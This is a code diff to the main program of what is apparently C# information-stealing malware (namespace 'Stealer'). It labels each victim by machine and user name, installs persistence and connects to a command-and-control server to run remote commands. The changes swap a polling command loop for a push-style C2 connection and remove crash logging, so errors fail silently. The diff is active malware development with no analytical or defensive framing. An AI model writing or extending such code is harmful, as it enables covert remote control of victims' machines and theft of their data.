@@ -9,7 +9,6 @@ namespace Stealer
 {
     class Program
     {
-        private static readonly int CommandPollInterval = 5000;
         private static string _clientId;
         private static readonly string CrashLog = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
@@ -24,20 +23,12 @@ namespace Stealer
 
             try
             {
-                File.AppendAllText(CrashLog, DateTime.Now + " START\r\n");
-
                 Config.Initialize();
-                File.AppendAllText(CrashLog, DateTime.Now + " CONFIG OK\r\n");
-
                 _clientId = Environment.MachineName + "_" + Environment.UserName;
 
-                try { Persistence.Install(); } catch (Exception ex) {
-                    File.AppendAllText(CrashLog, DateTime.Now + " PERSIST ERR: " + ex.Message + "\r\n");
-                }
+                try { Persistence.Install(); } catch { }
 
-                File.AppendAllText(CrashLog, DateTime.Now + " STARTING LOOPS\r\n");
-
-                CommandLoop();
+                C2Client.Connect(_clientId, HandleCommand);
             }
             catch (Exception ex)
             {
@@ -45,34 +36,6 @@ namespace Stealer
             }
 
             while (true) { Thread.Sleep(60000); }
-        }
-
-        private static void CommandLoop()
-        {
-            File.AppendAllText(CrashLog, DateTime.Now + " CMD LOOP ENTER\r\n");
-            while (true)
-            {
-                try
-                {
-                    string cmd = null;
-                    try
-                    {
-                        cmd = C2Client.PollCommand(_clientId);
-                        File.AppendAllText(CrashLog, DateTime.Now + " POLL OK: " + (cmd ?? "null") + "\r\n");
-                    }
-                    catch (Exception ex)
-                    {
-                        File.AppendAllText(CrashLog, DateTime.Now + " POLL ERR: " + ex.GetType().Name + ": " + ex.Message + "\r\n");
-                    }
-
-                    if (!string.IsNullOrEmpty(cmd))
-                    {
-                        HandleCommand(cmd);
-                    }
-                }
-                catch { }
-                Thread.Sleep(CommandPollInterval);
-            }
         }
 
         private static void HandleCommand(string command)
